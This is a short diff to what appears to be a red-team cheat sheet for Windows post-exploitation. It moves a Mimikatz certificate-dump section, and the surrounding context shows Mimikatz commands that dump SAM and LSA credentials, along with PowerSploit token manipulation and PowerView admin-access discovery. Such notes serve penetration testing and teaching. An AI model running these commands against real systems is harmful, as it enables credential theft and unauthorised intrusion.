@@ -207,6 +207,11 @@ lsadump::sam SamBkup.hiv SystemBkup.hiv
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 ```
 
+#### Mimikatz dump certs
+```
+Invoke-Mimikatz –DumpCerts
+```
+
 ## Token manipulation
 - https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1
 
@@ -234,11 +239,6 @@ Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\WindowsPowerShell\v
 #### Powerview
 ```
 Find-LocalAdminAccess -Verbose
-```
-
-#### Mimikatz dump certs
-```
-Invoke-Mimikatz –DumpCerts
 ```
 
 ### Other scripts
